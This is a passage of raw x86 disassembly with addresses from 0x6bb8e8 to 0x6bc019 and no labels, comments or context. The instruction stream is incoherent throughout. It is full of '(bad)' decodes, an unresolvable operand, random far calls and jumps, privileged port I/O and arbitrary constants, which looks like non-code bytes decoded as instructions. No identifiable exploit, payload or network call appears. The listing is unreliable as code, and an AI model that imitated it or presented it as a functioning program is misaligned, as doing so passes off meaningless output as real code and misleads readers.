  6bb8e8:	ins    BYTE PTR es:[edi],dx
  6bb8e9:	push   esi
  6bb8ea:	sbb    al,0x50
  6bb8ec:	into   
  6bb8ed:	and    bl,BYTE PTR ds:0x1813d2fe
  6bb8f3:	sub    DWORD PTR [esi-0x7a7cc59e],0x5b8d6d4a
  6bb8fd:	cmp    al,BYTE PTR [ebp+0x4a]
  6bb900:	push   esp
  6bb901:	int    0x59
  6bb903:	cmp    ebp,ecx
  6bb905:	pop    edx
  6bb906:	repnz out dx,al
  6bb908:	jle    0x6bb97c
  6bb90a:	in     eax,0x6c
  6bb90c:	fistp  QWORD PTR [edi+0x15a80d39]
  6bb912:	test   DWORD PTR [ecx-0x2b0a2f11],0xf30e82ff
  6bb91c:	ret    0x9fab
  6bb91f:	cmp    DWORD PTR [ebx],esi
  6bb921:	imul   ebx,esi,0x1f7d40f6
  6bb927:	mov    ?,WORD PTR [edi-0x10]
  6bb92a:	xor    ecx,esi
  6bb92c:	popf   
  6bb92d:	imul   DWORD PTR ds:0xb3579114
  6bb933:	sub    eax,DWORD PTR [ebx]
  6bb935:	call   0xe96a:0x4a428fe5
  6bb93c:	lock lock stos DWORD PTR es:[edi],eax
  6bb93f:	jmp    0x6bb997
  6bb941:	cmp    esi,ebp
  6bb943:	cdq    
  6bb944:	loope  0x6bb941
  6bb946:	sbb    BYTE PTR [esi+0x70],ah
  6bb949:	add    bl,dh
  6bb94b:	mov    ds:0x5f6deeca,eax
  6bb950:	es aad 0x32
  6bb953:	mov    dh,BYTE PTR [ecx-0x3f]
  6bb956:	or     DWORD PTR [edi-0x7126a3b3],edx
  6bb95c:	aas    
  6bb95d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bb95e:	dec    edx
  6bb95f:	push   es
  6bb960:	jmp    0x6770693c
  6bb965:	(bad)  
  6bb966:	jmp    0x2b72:0x45a9607e
  6bb96d:	shl    DWORD PTR [edi-0x5c6867d8],cl
  6bb973:	aam    0x48
  6bb975:	add    bh,BYTE PTR [edi+0x55bcc7f8]
  6bb97b:	adc    ch,bl
  6bb97d:	test   eax,0xa9ef029
  6bb982:	xor    al,0x33
  6bb984:	iret   
  6bb985:	cmp    dh,BYTE PTR [edi]
  6bb987:	mov    edx,0xc243cea
  6bb98c:	outs   dx,BYTE PTR ds:[esi]
  6bb98d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bb98e:	test   DWORD PTR [edi+0x51],0xb64bd9bb
  6bb995:	ins    BYTE PTR es:[edi],dx
  6bb996:	dec    eax
  6bb997:	mov    edx,0x5d687b38
  6bb99c:	inc    ebp
  6bb99d:	push   ecx
  6bb99e:	mov    ecx,0x23b986e2
  6bb9a3:	fmul   DWORD PTR [eax+0x25]
  6bb9a6:	bound  ebp,QWORD PTR [ebp-0x46]
  6bb9a9:	xor    DWORD PTR [esi+0x9],ecx
  6bb9ac:	or     dh,bh
  6bb9ae:	push   ds
  6bb9af:	xor    DWORD PTR [ebx+0x1bae057d],edi
  6bb9b5:	(bad)  
  6bb9b6:	leave  
  6bb9b7:	test   al,0xb6
  6bb9b9:	mov    edx,DWORD PTR [ebx-0x4eba210b]
  6bb9bf:	int3   
  6bb9c0:	pop    ss
  6bb9c1:	adc    ecx,ecx
  6bb9c3:	retf   0xa289
  6bb9c6:	jno    0x6bba11
  6bb9c8:	pushf  
  6bb9c9:	xor    ecx,DWORD PTR ds:0xbacbcf4d
  6bb9cf:	jge    0x6bb95e
  6bb9d1:	xchg   esp,eax
  6bb9d2:	(bad)  
  6bb9d3:	sar    bl,cl
  6bb9d5:	sbb    al,0xd3
  6bb9d7:	int    0x25
  6bb9d9:	jb     0x6bb987
  6bb9db:	inc    edx
  6bb9dc:	xchg   BYTE PTR [esi+0x26fdf435],ch
  6bb9e2:	mov    ecx,0x506ad4e4
  6bb9e7:	shl    DWORD PTR [ecx+0x21e5d881],cl
  6bb9ed:	fmulp  st(2),st
  6bb9ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bb9f0:	cs dec ebx
  6bb9f2:	mov    es,WORD PTR [eax+esi*2+0x3004c0be]
  6bb9f9:	mov    ah,0x36
  6bb9fb:	loope  0x6bb9b7
  6bb9fd:	xchg   ecx,eax
  6bb9fe:	nop
  6bb9ff:	repz mov ch,0x16
  6bba02:	and    ecx,ecx
  6bba04:	test   BYTE PTR [edi-0x6546d764],al
  6bba0a:	fistp  DWORD PTR [eax+eiz*4+0x15]
  6bba0e:	in     eax,0xcf
  6bba10:	xor    eax,0xc4ccb690
  6bba15:	jg     0x6bba32
  6bba17:	fdiv   st,st(2)
  6bba19:	xlat   BYTE PTR ds:[ebx]
  6bba1a:	rcl    DWORD PTR [ebx-0x25529b95],1
  6bba20:	mov    edx,0xad18660c
  6bba25:	pop    edx
  6bba26:	cmp    DWORD PTR [edx-0x54],edx
  6bba29:	pop    esi
  6bba2a:	test   DWORD PTR ds:0x404716d6,0x74999fee
  6bba34:	push   edi
  6bba35:	stos   DWORD PTR es:[edi],eax
  6bba36:	xor    eax,0x672a8b48
  6bba3b:	aas    
  6bba3c:	or     DWORD PTR [edi-0x650d9551],0x390f3e08
  6bba46:	push   esp
  6bba47:	out    0xa,eax
  6bba49:	xchg   edi,eax
  6bba4a:	mov    dh,0xad
  6bba4c:	mov    ds:0x74ca00d2,al
  6bba51:	dec    esi
  6bba52:	dec    ebx
  6bba53:	cmp    DWORD PTR [eax+0x0],esi
  6bba56:	test   BYTE PTR [edx-0x7b],cl
  6bba59:	sbb    eax,0x426d81a0
  6bba5e:	pop    es
  6bba5f:	scas   eax,DWORD PTR es:[edi]
  6bba60:	sub    BYTE PTR [esi],bl
  6bba62:	addr16 or al,0x8b
  6bba65:	out    dx,eax
  6bba66:	ror    ah,1
  6bba68:	dec    ebx
  6bba69:	inc    edx
  6bba6a:	push   cs
  6bba6b:	sti    
  6bba6c:	test   BYTE PTR [ebx],0x18
  6bba6f:	gs js  0x6bba32
  6bba72:	in     eax,0xe
  6bba74:	jge    0x6bbad4
  6bba76:	leave  
  6bba77:	fidivr DWORD PTR [ecx+0x4bfb0680]
  6bba7d:	dec    ebx
  6bba7e:	push   edi
  6bba7f:	sub    bh,BYTE PTR [ebp+0xc165264]
  6bba85:	out    dx,al
  6bba86:	jmp    0xe3ca:0xd0ff0866
  6bba8d:	(bad)  
  6bba8f:	cmp    DWORD PTR [eax+0x4d4c944a],edx
  6bba95:	mov    bh,0xf2
  6bba97:	div    BYTE PTR [ecx]
  6bba99:	ja     0x6bbaa3
  6bba9b:	test   al,0xca
  6bba9d:	mov    esi,eax
  6bba9f:	stos   BYTE PTR es:[edi],al
  6bbaa0:	mov    bh,0x91
  6bbaa2:	jecxz  0x6bba47
  6bbaa4:	ret    0x7295
  6bbaa7:	int3   
  6bbaa8:	inc    esi
  6bbaa9:	inc    cx
  6bbaab:	jg     0x6bbb17
  6bbaad:	sub    edx,0x1c053e11
  6bbab3:	retf   
  6bbab4:	loope  0x6bba43
  6bbab6:	inc    ebp
  6bbab7:	addr16 retf 0x62cf
  6bbabb:	fstp   TBYTE PTR [ebp-0x53]
  6bbabe:	push   ecx
  6bbabf:	out    dx,al
  6bbac0:	pop    edx
  6bbac1:	fwait
  6bbac2:	test   BYTE PTR [edi+0x39],0x51
  6bbac6:	and    al,0x93
  6bbac8:	mov    esp,0xb21fb565
  6bbacd:	(bad)
  6bbad0:	or     ebp,DWORD PTR [ebx+esi*1]
  6bbad3:	in     al,0x98
  6bbad5:	add    DWORD PTR [ebp-0x38252eed],ebx
  6bbadb:	mov    dl,0xc
  6bbadd:	ret    
  6bbade:	pop    ebp
  6bbadf:	push   ss
  6bbae0:	mov    BYTE PTR [edx-0xfcd012a],ch
  6bbae6:	pop    es
  6bbae7:	inc    eax
  6bbae8:	pusha  
  6bbae9:	sub    ah,BYTE PTR [eax-0x70]
  6bbaec:	push   ecx
  6bbaed:	adc    bh,BYTE PTR [esi-0x21259b03]
  6bbaf3:	out    0xe8,eax
  6bbaf5:	add    BYTE PTR [esi],dl
  6bbaf7:	loop   0x6bbb34
  6bbaf9:	push   edx
  6bbafa:	scas   al,BYTE PTR es:[edi]
  6bbafb:	jns    0x6bbb5b
  6bbafd:	xlat   BYTE PTR ds:[ebx]
  6bbafe:	rol    ebp,1
  6bbb00:	sub    ch,BYTE PTR [edi]
  6bbb02:	int    0x7a
  6bbb04:	cs repnz pop ebx
  6bbb07:	xchg   edx,eax
  6bbb08:	stos   DWORD PTR es:[edi],eax
  6bbb09:	dec    ebp
  6bbb0a:	mov    cl,0x65
  6bbb0c:	test   al,0xe7
  6bbb0e:	aaa    
  6bbb0f:	les    ebx,FWORD PTR [esi+esi*8-0x68]
  6bbb13:	push   edi
  6bbb14:	fsub   QWORD PTR [eax-0x1b]
  6bbb17:	mov    bl,0x5b
  6bbb19:	xchg   esi,eax
  6bbb1a:	(bad)
  6bbb1d:	xchg   DWORD PTR [edx+0x4e57ac5b],esp
  6bbb23:	cmp    DWORD PTR [eax-0x4a67c135],ecx
  6bbb29:	in     eax,0x75
  6bbb2b:	mov    esp,DWORD PTR [eax]
  6bbb2d:	inc    ecx
  6bbb2e:	leave  
  6bbb2f:	in     eax,dx
  6bbb30:	cmc    
  6bbb31:	dec    esi
  6bbb32:	cmp    al,0x37
  6bbb34:	push   eax
  6bbb35:	push   edi
  6bbb36:	popf   
  6bbb37:	test   eax,0x64a407e9
  6bbb3c:	rol    DWORD PTR [eax-0x76a11ef2],0x7
  6bbb43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6bbb44:	and    al,0x5e
  6bbb46:	and    edi,DWORD PTR [edi-0x352e6a47]
  6bbb4c:	mov    eax,0xfbdb83a8
  6bbb51:	outs   dx,DWORD PTR ds:[esi]
  6bbb52:	shl    DWORD PTR [edx+0x6a3015a1],0xc3
  6bbb59:	ss aad 0x5e
  6bbb5c:	jnp    0x6bbaed
  6bbb5e:	ret    0xf839
  6bbb61:	call   0xc2ea:0x4d28b245
  6bbb68:	or     al,0x8a
  6bbb6a:	mov    eax,0x4d5c47bb
  6bbb6f:	xchg   BYTE PTR [esi],ch
  6bbb71:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bbb72:	jg     0x6bbbba
  6bbb74:	ins    BYTE PTR es:[edi],dx
  6bbb75:	push   esp
  6bbb76:	clc    
  6bbb77:	ret    0x188
  6bbb7a:	dec    esp
  6bbb7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bbb7c:	ins    BYTE PTR es:[edi],dx
  6bbb7d:	mov    al,0x15
  6bbb7f:	popa   
  6bbb80:	mov    edx,0xd8323664
  6bbb85:	add    al,0xf3
  6bbb87:	mov    ebp,0xda656ee7
  6bbb8c:	into   
  6bbb8d:	adc    BYTE PTR ds:0x8e6c5278,bh
  6bbb93:	push   esp
  6bbb94:	loope  0x6bbbc3
  6bbb96:	pop    eax
  6bbb97:	xor    eax,0x28d5d993
  6bbb9c:	repz mov eax,ds:0x3f5e6e72
  6bbba2:	mov    BYTE PTR [ebp+0xf],cl
  6bbba5:	mov    ecx,0xe584519a
  6bbbaa:	or     al,bl
  6bbbac:	adc    dh,al
  6bbbae:	pop    esi
  6bbbaf:	inc    esi
  6bbbb0:	das    
  6bbbb1:	out    dx,eax
  6bbbb2:	adc    al,0x5
  6bbbb4:	add    BYTE PTR [edi],dl
  6bbbb6:	and    DWORD PTR [esp+esi*2+0x6e67807a],edi
  6bbbbd:	inc    ebp
  6bbbbe:	push   0x5d
  6bbbc0:	rcr    DWORD PTR [esi+edi*8+0x40],0xe1
  6bbbc5:	sub    BYTE PTR [edx],cl
  6bbbc7:	bound  ebx,QWORD PTR ds:0xd9977671
  6bbbcd:	imul   edi,DWORD PTR [ebp+0x1594d610],0xffffffe1
  6bbbd4:	rol    BYTE PTR [edx],cl
  6bbbd6:	sbb    BYTE PTR [edi+ecx*8-0x1a],ah
  6bbbda:	int    0x8
  6bbbdc:	loop   0x6bbb99
  6bbbde:	adc    edx,DWORD PTR [esi+ebp*4]
  6bbbe1:	adc    eax,0xbf58e7e7
  6bbbe6:	pop    esi
  6bbbe7:	xchg   ebx,eax
  6bbbe8:	out    dx,al
  6bbbe9:	cdq    
  6bbbea:	or     BYTE PTR [edi-0x77f8fa3b],0x2a
  6bbbf1:	outs   dx,DWORD PTR ds:[esi]
  6bbbf2:	call   FWORD PTR [ecx-0x469a279]
  6bbbf8:	mov    bl,BYTE PTR [eax]
  6bbbfa:	xchg   edx,eax
  6bbbfb:	in     al,dx
  6bbbfc:	mov    al,ds:0xb3d7e767
  6bbc01:	int    0xfd
  6bbc03:	push   esp
  6bbc04:	adc    dl,dl
  6bbc06:	repnz mov ebx,0x8c34d8ad
  6bbc0c:	jnp    0x6bbc71
  6bbc0e:	pushf  
  6bbc0f:	mov    esp,0x2f8f1022
  6bbc14:	icebp  
  6bbc15:	pop    edi
  6bbc16:	(bad)  
  6bbc17:	repz ficomp DWORD PTR [edi+ebp*4+0x5b3eb446]
  6bbc1f:	sar    DWORD PTR [esi],1
  6bbc21:	cmp    DWORD PTR [eax+0x6b8e5234],edi
  6bbc27:	ror    DWORD PTR ds:0xe3288be7,1
  6bbc2d:	pop    esi
  6bbc2e:	int3   
  6bbc2f:	or     esi,DWORD PTR [ebx+edi*2+0x3e]
  6bbc33:	cmp    DWORD PTR [ebx],ecx
  6bbc35:	mov    ah,0x29
  6bbc37:	jecxz  0x6bbc4c
  6bbc39:	inc    esi
  6bbc3a:	das    
  6bbc3b:	sbb    BYTE PTR [eax],bh
  6bbc3d:	pushf  
  6bbc3e:	mov    gs,WORD PTR [ecx]
  6bbc40:	sar    BYTE PTR [edi-0x3ebd3791],cl
  6bbc46:	jns    0x6bbca9
  6bbc48:	ins    DWORD PTR es:[edi],dx
  6bbc49:	cli    
  6bbc4a:	xor    cl,BYTE PTR ds:0xf670dec7
  6bbc50:	pusha  
  6bbc51:	jbe    0x6bbca9
  6bbc53:	jp     0x6bbbfb
  6bbc55:	push   edi
  6bbc56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bbc57:	mov    edi,0x9bae7fb8
  6bbc5c:	rcl    eax,0x97
  6bbc5f:	push   0x8b55e247
  6bbc64:	in     al,0x67
  6bbc66:	fiadd  DWORD PTR [ecx-0x3d]
  6bbc69:	in     al,dx
  6bbc6a:	das    
  6bbc6b:	es pop edx
  6bbc6d:	xchg   esp,eax
  6bbc6e:	ret    0x2c7f
  6bbc71:	stos   BYTE PTR es:[edi],al
  6bbc72:	call   0xe5d5:0x3479ebb0
  6bbc79:	dec    edi
  6bbc7a:	jecxz  0x6bbc22
  6bbc7c:	ds cdq 
  6bbc7e:	mov    edx,0x81c2fead
  6bbc83:	stos   BYTE PTR es:[edi],al
  6bbc84:	inc    ecx
  6bbc85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bbc86:	daa    
  6bbc87:	adc    ebp,DWORD PTR [ecx+0x6862c738]
  6bbc8d:	sub    DWORD PTR [edi],esi
  6bbc8f:	mov    dh,0x29
  6bbc91:	(bad)  
  6bbc92:	mov    dh,0x75
  6bbc94:	sar    DWORD PTR [ecx],0xde
  6bbc97:	jmp    0xec2:0x72b939e7
  6bbc9e:	adc    esp,0xf
  6bbca1:	pop    esi
  6bbca2:	add    al,0xf0
  6bbca4:	test   BYTE PTR [ecx-0x2c269dac],0x30
  6bbcab:	mov    ebx,0xbdb9c03c
  6bbcb0:	mov    dl,0xf0
  6bbcb2:	xchg   esi,eax
  6bbcb3:	test   eax,0xa4b2a38
  6bbcb8:	sbb    BYTE PTR [edi+0x31],0xee
  6bbcbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bbcbd:	push   0xffffff80
  6bbcbf:	inc    ebp
  6bbcc0:	and    DWORD PTR [ecx-0x7b966a99],edi
  6bbcc6:	into   
  6bbcc7:	(bad)  
  6bbcc9:	fsub   QWORD PTR [edi]
  6bbccb:	inc    ecx
  6bbccc:	jns    0x6bbc67
  6bbcce:	outs   dx,DWORD PTR ds:[esi]
  6bbccf:	mov    ch,0x79
  6bbcd1:	js     0x6bbcdb
  6bbcd3:	xchg   BYTE PTR [esi+0x79],ah
  6bbcd6:	mov    BYTE PTR [ebp-0x2b],ah
  6bbcd9:	add    edx,DWORD PTR [edx-0x337f04ed]
  6bbcdf:	cmp    bl,cl
  6bbce1:	sbb    edx,DWORD PTR [esi+0x360fbe1b]
  6bbce7:	sbb    al,BYTE PTR ds:0x48f70db7
  6bbced:	mov    DWORD PTR [eax],edi
  6bbcef:	jbe    0x6bbcd3
  6bbcf1:	(bad)  
  6bbcf2:	xlat   BYTE PTR ds:[ebx]
  6bbcf3:	shr    bh,cl
  6bbcf5:	sub    esi,ecx
  6bbcf7:	and    dl,dl
  6bbcf9:	push   ds
  6bbcfa:	xor    BYTE PTR ds:[esi-0x5d58fcaf],bl
  6bbd01:	jno    0x6bbd61
  6bbd03:	xor    eax,DWORD PTR [ebx-0x72]
  6bbd06:	push   0x894071b9
  6bbd0b:	sbb    dh,BYTE PTR [esi+0x1b58cac4]
  6bbd11:	pop    esi
  6bbd12:	push   edx
  6bbd13:	xchg   BYTE PTR [ebp+eax*8+0x35],dl
  6bbd17:	fidivr WORD PTR [esi]
  6bbd19:	pushf  
  6bbd1a:	pop    ds
  6bbd1b:	dec    eax
  6bbd1c:	bound  edi,QWORD PTR [ebx+eax*2-0x4c538e0a]
  6bbd23:	push   ebp
  6bbd24:	add    al,0x26
  6bbd26:	jle    0x6bbcbd
  6bbd28:	xchg   ecx,eax
  6bbd29:	fisub  WORD PTR [edx+0x2e8ed973]
  6bbd2f:	fdivr  QWORD PTR [edx+0x6a0bbb5e]
  6bbd35:	sub    DWORD PTR [ecx],edx
  6bbd37:	mov    gs,WORD PTR [edx]
  6bbd39:	and    al,0x45
  6bbd3b:	and    BYTE PTR [ecx-0x3b],ch
  6bbd3e:	nop
  6bbd3f:	xchg   ebx,eax
  6bbd40:	test   DWORD PTR [esi+0x6b0b750],edx
  6bbd46:	fimul  DWORD PTR [ebp-0x15248c8e]
  6bbd4c:	xchg   ebx,eax
  6bbd4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bbd4e:	mov    ebp,0x78b0fe5
  6bbd53:	push   esi
  6bbd54:	and    edi,eax
  6bbd56:	xchg   edi,eax
  6bbd57:	mov    esi,DWORD PTR [edx+0x14]
  6bbd5a:	jne    0x6bbdb1
  6bbd5c:	or     DWORD PTR [eax-0x5c10c15a],eax
  6bbd62:	stos   DWORD PTR es:[edi],eax
  6bbd63:	icebp  
  6bbd64:	cli    
  6bbd65:	mov    edx,0x7d59c609
  6bbd6a:	test   DWORD PTR [edx-0x16],eax
  6bbd6d:	adc    bl,BYTE PTR [edx+0x63c10e5d]
  6bbd73:	cwde   
  6bbd74:	punpcklbw mm2,DWORD PTR [edx]
  6bbd77:	dec    ecx
  6bbd78:	jae    0x6bbcfe
  6bbd7a:	inc    ecx
  6bbd7b:	mov    ecx,0x57067a21
  6bbd80:	aas    
  6bbd81:	jl     0x6bbdc6
  6bbd83:	shl    BYTE PTR [eax-0x54],cl
  6bbd86:	lds    ebp,FWORD PTR ds:0x51921f3b
  6bbd8c:	jo     0x6bbdf5
  6bbd8e:	sbb    BYTE PTR ds:0xf863b098,0x90
  6bbd95:	pop    ebx
  6bbd96:	cmp    ecx,DWORD PTR [ecx-0x3bb1de19]
  6bbd9c:	loope  0x6bbda9
  6bbd9e:	mov    al,BYTE PTR ss:[edx]
  6bbda1:	sub    eax,0xe3c9628
  6bbda6:	sti    
  6bbda7:	xor    al,0x82
  6bbda9:	dec    ecx
  6bbdaa:	add    DWORD PTR [esp+edi*1-0x69],0x3143dfd9
  6bbdb2:	add    BYTE PTR ds:0xf22c1a63,ch
  6bbdb8:	sbb    al,0xa8
  6bbdba:	dec    esi
  6bbdbb:	retf   0xf8e0
  6bbdbe:	jmp    0xafa9:0xa84be281
  6bbdc5:	sar    DWORD PTR [ebx-0x3074020e],cl
  6bbdcb:	test   cl,dl
  6bbdcd:	add    cl,BYTE PTR [eax+0x76]
  6bbdd0:	push   esp
  6bbdd1:	xor    esp,DWORD PTR [ebx]
  6bbdd3:	jmp    0x96aa4d12
  6bbdd8:	(bad)  
  6bbdd9:	inc    ebx
  6bbdda:	and    BYTE PTR [esi*2+0x6c229eb6],bl
  6bbde1:	push   eax
  6bbde2:	adc    BYTE PTR [eax-0xc],cl
  6bbde5:	cs out dx,al
  6bbde7:	int3   
  6bbde8:	add    eax,0x7cde0907
  6bbded:	lock pop edi
  6bbdef:	(bad)  
  6bbdf0:	sub    eax,DWORD PTR [edi+0x1d]
  6bbdf3:	jge    0x6bbe58
  6bbdf5:	ja     0x6bbd93
  6bbdf7:	inc    ecx
  6bbdf8:	bound  ecx,QWORD PTR ds:0x6433f77d
  6bbdfe:	mov    edi,0x2aa8b0bf
  6bbe03:	js     0x6bbe46
  6bbe05:	cdq    
  6bbe06:	add    BYTE PTR [ecx+eiz*8],bl
  6bbe09:	test   esi,edi
  6bbe0b:	push   esi
  6bbe0c:	sbb    esi,DWORD PTR [ebx+0x72f60419]
  6bbe12:	add    BYTE PTR [ecx+eiz*2],cl
  6bbe15:	clc    
  6bbe16:	lds    ebp,FWORD PTR [eax]
  6bbe18:	dec    eax
  6bbe19:	add    eax,0xc1ebf90d
  6bbe1e:	enter  0xb046,0x82
  6bbe22:	adc    edi,esi
  6bbe24:	dec    edx
  6bbe25:	rol    BYTE PTR [esp+eax*4-0x6380eb23],0xd1
  6bbe2d:	push   edx
  6bbe2e:	add    eax,0x9a21ddf5
  6bbe33:	imul   ecx,DWORD PTR [esi],0x42
  6bbe36:	pop    es
  6bbe37:	push   ebp
  6bbe38:	int    0x1c
  6bbe3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6bbe3b:	cdq    
  6bbe3c:	sbb    al,0x15
  6bbe3e:	xchg   esp,eax
  6bbe3f:	stos   DWORD PTR es:[edi],eax
  6bbe40:	shr    DWORD PTR ds:0xf8fb5ad0,1
  6bbe46:	or     eax,0xc1c66172
  6bbe4b:	popa   
  6bbe4c:	ja     0x6bbe37
  6bbe4e:	pusha  
  6bbe4f:	pop    esi
  6bbe50:	dec    ecx
  6bbe51:	fcmove st,st(5)
  6bbe53:	pop    edx
  6bbe54:	and    al,0xa7
  6bbe56:	cdq    
  6bbe57:	add    eax,0xed6c846c
  6bbe5c:	popf   
  6bbe5d:	inc    esp
  6bbe5e:	mov    ebp,0x3cf25641
  6bbe63:	cmp    eax,0xc9ece665
  6bbe68:	xlat   BYTE PTR ds:[ebx]
  6bbe69:	lahf   
  6bbe6a:	(bad)  
  6bbe6b:	xor    eax,esi
  6bbe6d:	push   0x111902ce
  6bbe72:	fmul   DWORD PTR [edx-0x12]
  6bbe75:	jp     0x6bbeb1
  6bbe77:	scas   al,BYTE PTR es:[edi]
  6bbe78:	lods   al,BYTE PTR ds:[esi]
  6bbe79:	cdq    
  6bbe7a:	rcl    BYTE PTR [ebp+0x528e39fe],1
  6bbe80:	lahf   
  6bbe81:	and    ebx,DWORD PTR [eiz*4+0x52e2186]
  6bbe88:	mov    BYTE PTR [esi+0x5c70d41f],dl
  6bbe8e:	or     BYTE PTR [edx],dl
  6bbe90:	ret    
  6bbe91:	or     al,0x5a
  6bbe93:	or     ecx,edx
  6bbe95:	adc    ebp,DWORD PTR [ebp+0x32276d76]
  6bbe9b:	or     ebp,DWORD PTR [ebp+0x38]
  6bbe9e:	mov    edi,0x2b3d0ce0
  6bbea3:	outs   dx,BYTE PTR ds:[esi]
  6bbea4:	push   0x79
  6bbea6:	mov    edx,0x3e2df090
  6bbeab:	fsub   DWORD PTR [eax-0x167f7c00]
  6bbeb1:	sub    ebx,DWORD PTR [edx]
  6bbeb3:	scas   eax,DWORD PTR es:[edi]
  6bbeb4:	and    eax,0xc4f5f67a
  6bbeb9:	dec    edx
  6bbeba:	imul   esp,DWORD PTR [esi],0xf103655d
  6bbec0:	dec    esi
  6bbec1:	sub    al,dl
  6bbec3:	les    esi,FWORD PTR [edi+0x582cdb9f]
  6bbec9:	lock mov bl,BYTE PTR ds:[edx+eiz*8]
  6bbece:	outs   dx,DWORD PTR ds:[esi]
  6bbecf:	lds    esp,FWORD PTR [ecx+0x3dcdcd49]
  6bbed5:	add    bl,BYTE PTR [ebp+edi*1-0x38b7b440]
  6bbedc:	mov    al,0x48
  6bbede:	std    
  6bbedf:	int3   
  6bbee0:	icebp  
  6bbee1:	ins    DWORD PTR es:[edi],dx
  6bbee2:	pushf  
  6bbee3:	jae    0x6bbf0c
  6bbee5:	or     DWORD PTR [esi+0x22],edi
  6bbee8:	fwait
  6bbee9:	jle    0x6bbf56
  6bbeeb:	adc    ebp,DWORD PTR [edx-0x34]
  6bbeee:	mov    esp,0xb06eea4d
  6bbef3:	mov    ds:0x3e65d82e,eax
  6bbef8:	inc    ebx
  6bbef9:	push   ss
  6bbefa:	leave  
  6bbefb:	mov    es,WORD PTR [ebp+edx*1+0x4a]
  6bbeff:	es inc edi
  6bbf01:	test   cl,bh
  6bbf03:	jle    0x6bbf1d
  6bbf05:	mov    ds:0x561b7ae3,al
  6bbf0a:	xor    ebx,edi
  6bbf0c:	sub    al,0xad
  6bbf0e:	fwait
  6bbf0f:	cwde   
  6bbf10:	cmp    ah,al
  6bbf12:	lds    ebx,FWORD PTR fs:[ebp-0x60905237]
  6bbf19:	or     eax,0x38c1e1
  6bbf1e:	xchg   ebx,eax
  6bbf1f:	jne    0x6bbf65
  6bbf21:	into   
  6bbf22:	cmp    ecx,DWORD PTR [ebx+ecx*4+0x5beecde2]
  6bbf29:	jecxz  0x6bbf6f
  6bbf2b:	jae    0x6bbf30
  6bbf2d:	xchg   esi,eax
  6bbf2e:	cmp    ebp,eax
  6bbf30:	(bad)  
  6bbf32:	mov    al,ds:0x3f4fc06a
  6bbf37:	jae    0x6bbf6b
  6bbf39:	xchg   ebx,ecx
  6bbf3b:	fsub   QWORD PTR [esi]
  6bbf3d:	enter  0x37bb,0x32
  6bbf41:	add    DWORD PTR [edi],ebx
  6bbf43:	xchg   ecx,eax
  6bbf44:	sub    ebp,edi
  6bbf46:	xchg   BYTE PTR [edx],ch
  6bbf48:	(bad)  
  6bbf49:	retf   0xc225
  6bbf4c:	mov    esi,0x7a5f6bee
  6bbf51:	jge    0x6bbf8b
  6bbf53:	or     BYTE PTR [ecx-0x3fcba331],bl
  6bbf59:	cmc    
  6bbf5a:	sub    eax,0x644b5adb
  6bbf5f:	pop    edx
  6bbf60:	pop    ebx
  6bbf61:	add    bl,0x2e
  6bbf64:	adc    cl,bl
  6bbf66:	adc    DWORD PTR [ecx-0x5769a044],ecx
  6bbf6c:	cmp    eax,0x8846044f
  6bbf71:	sub    bh,BYTE PTR [ebx]
  6bbf73:	cmc    
  6bbf74:	cmp    BYTE PTR [edx],bh
  6bbf76:	mov    eax,ds:0x78395714
  6bbf7b:	stc    
  6bbf7c:	bound  ebx,QWORD PTR [ecx]
  6bbf7e:	xchg   DWORD PTR [edx+0x4a267502],edi
  6bbf84:	in     eax,dx
  6bbf85:	xor    DWORD PTR [edi+eax*1],ebp
  6bbf88:	lods   al,BYTE PTR ds:[esi]
  6bbf89:	retf   0xa146
  6bbf8c:	sbb    ch,BYTE PTR ds:0xbc5fb374
  6bbf92:	xlat   BYTE PTR ds:[ebx]
  6bbf93:	stos   DWORD PTR es:[edi],eax
  6bbf94:	ss lahf 
  6bbf96:	sbb    ebp,esi
  6bbf98:	cli    
  6bbf99:	mov    ds:0x3fcb0816,eax
  6bbf9e:	add    al,BYTE PTR [edx-0x6a832901]
  6bbfa4:	mov    esp,esp
  6bbfa6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6bbfa7:	inc    edi
  6bbfa8:	dec    eax
  6bbfa9:	push   esp
  6bbfaa:	int3   
  6bbfab:	adc    dl,bh
  6bbfad:	dec    DWORD PTR [esi-0x7f09bd89]
  6bbfb3:	mov    ds:0xb53b3032,al
  6bbfb8:	loopne 0x6bbf6e
  6bbfba:	sub    edi,esi
  6bbfbc:	inc    ebp
  6bbfbd:	dec    ecx
  6bbfbe:	mov    cl,0x33
  6bbfc0:	mov    ch,0xbb
  6bbfc2:	lahf   
  6bbfc3:	jmp    0x2948c1fb
  6bbfc8:	pop    ss
  6bbfc9:	in     al,0x64
  6bbfcb:	in     al,0x9a
  6bbfcd:	enter  0x83f5,0x10
  6bbfd1:	mov    ah,0x10
  6bbfd3:	int3   
  6bbfd4:	dec    edx
  6bbfd5:	inc    eax
  6bbfd6:	push   cs
  6bbfd7:	stos   BYTE PTR es:[edi],al
  6bbfd8:	daa    
  6bbfd9:	call   0x6c45:0x3d7c24d
  6bbfe0:	test   DWORD PTR [esp+eax*8],0xdaec3065
  6bbfe7:	mov    bl,0xf8
  6bbfe9:	pop    esi
  6bbfea:	mov    eax,0x39b4b6f6
  6bbfef:	jp     0x6bc022
  6bbff1:	std    
  6bbff2:	data16 adc BYTE PTR [ecx-0x51c63fdd],ch
  6bbff9:	xor    bl,ah
  6bbffb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6bbffc:	test   BYTE PTR [ebx],dh
  6bbffe:	and    eax,0xe0f206e3
  6bc003:	pusha  
  6bc004:	xchg   ecx,eax
  6bc005:	xor    DWORD PTR [ecx-0x61777b4c],ebp
  6bc00b:	aaa    
  6bc00c:	ror    DWORD PTR [ecx+0x1e],cl
  6bc00f:	popf   
  6bc010:	mov    ds:0x479133a3,eax
  6bc015:	push   es
  6bc016:	bound  eax,QWORD PTR [edi+0x7e]
  6bc019:	sahf   
